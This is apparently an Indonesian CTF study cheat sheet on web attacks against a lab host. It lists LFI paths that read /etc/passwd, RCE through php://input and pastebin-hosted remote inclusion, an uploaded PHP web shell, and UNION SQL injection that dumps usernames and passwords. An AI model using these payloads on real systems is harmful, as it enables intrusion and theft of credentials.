# CTF

* Web Security
* Reverse Engineering
* Binary Exploitation
* Cryprographi
* Forensic
* Steganography

<hr>

### Web Security

#### LFI & RCF

misal web dengan link

    http://192.168.43.207/ipb/ipbScript/PHP-LFI/index.php?page=page3.php

`...?page=page1.php`

dapat diganti

    ...?page=/etc/passwd
    ...?page=/etc/passwd%00 (php kuno)
    ...?page=../../../../../../../../../etc/passwd
    ...?page=php://filter/convert.base64-encode/resource=index.php
    ...?page=php://filter/convert.base64-encode/resource=index
    ...?page=http://localhost/(file .txt)?

use terminal

    curl -X "POST" -d "<?php echo shell_exec('cat /etc/passwd')?>" "http://192.168.43.207/ipb/ipbScript/PHP-LFI/index.php?page=php://input"

use pastebin.com

1. new paste
2. masukkan code
    ```php
    <pre>
    <?php
        echo "Tes RCE";
        echo shell_exec("ls -la");
    ?>
    </pre>
    ```
3. Paste expiration : 1 jam aja
4. Create New Paste
5. raw
6. ambil link raw
7.

    ...?page=http://pastebin.com/raw/(link)

<hr>

#### File Upload

membuat file tes.php

```php
<pre>
<?php
    echo shell_exec("ls -la /");
?>
</pre>
```
menggunakan burp suit
    
    edit type file
    rename file ->
        .php, .php3, .php4, .php5, .php7, .pht, .phtml 

<hr>

#### SQL Injection
    y'-- 
    y' OR 1=1 '-- 

misal url

    192.168.43.207/ipb/ipbScript/blog/post.php?id=1

diganti

    ...id=999999999 UNION SELECT 1,2,3,..., (sampai pas)

cari nama data base :
    
    ...id=999999999 UNION SELECT 1,database(),3,user()

cari nama tabel :

    ...id=999999999 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()

cari kolom tabel :

    ...id=999999999 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_schema = database() AND table_name = 'user'

next
    
    ...id=999999999 UNION SELECT 1,username,3,password FROM user
    ...id=999999999 UNION SELECT 1,username,3,password FROM user LIMIT 0/1/2,1 (baris/kolom ke ...)
    ...id=999999999 UNION SELECT 1,group_concat(username),3,group_concat(password) FROM user


